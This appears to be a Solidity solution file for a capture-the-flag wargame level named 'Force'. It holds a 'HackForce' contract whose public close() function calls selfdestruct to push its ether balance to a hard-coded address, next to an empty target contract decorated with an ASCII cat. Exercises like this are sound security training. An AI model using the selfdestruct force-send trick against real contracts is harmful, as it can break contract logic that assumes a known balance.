// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "./Force.sol";

contract HackForce {

  address payable private owner = payable(0xd8D8C3e355eC7c03FCa49Ae6616834E658Cbea37);
  mapping (address => uint) allocations;

  constructor() public payable {
    allocations[owner] = msg.value;
  }

  receive() external payable {
    allocations[owner] = msg.value;
  }

  function close() public { 
    selfdestruct(owner); 
  }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}